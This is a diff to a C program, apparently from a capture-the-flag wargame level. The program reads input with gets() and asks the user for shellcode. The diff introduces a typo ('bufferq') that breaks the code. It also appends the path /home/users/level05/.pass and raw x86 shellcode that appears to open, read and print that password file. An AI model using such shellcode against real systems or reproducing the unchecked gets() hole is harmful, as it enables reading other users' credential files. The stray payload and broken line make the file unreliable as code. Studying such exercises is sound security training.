@@ -37,7 +37,12 @@ int main(int argc, const char **argv, const char **envp)
     prctl(PR_SET_PDEATHSIG, SIGHUP);
     ptrace(PTRACE_TRACEME, 0, 0, 0); // this sends a signal to the parent, it unblocks the call to wait()
     puts("Give me some shellcode, k");
-    gets(buffer);
+    gets(bufferq);
   }
   return 0;
 }
+
+/home/users/level05/.pass
+\x68ssap\x68./50\x68leve\x68l/sr\x68esu/\x68emoh\x68/\x00\x00\x00
+
+\x31\xC9\xF7\xE1\xB0\x05\x51\x68ssap\x68./50\x68leve\x68l/sr\x68esu/\x68emoh\x68/\x00\x00\x00\x89\xE3\xCD\x80\x93\x91\xB0\x03\x66\xBA\xFF\x0F\x42\xCD\x80\x92\xB3\x01\xC1\xE8\x0A\xCD\x80\x93\xCD\x80
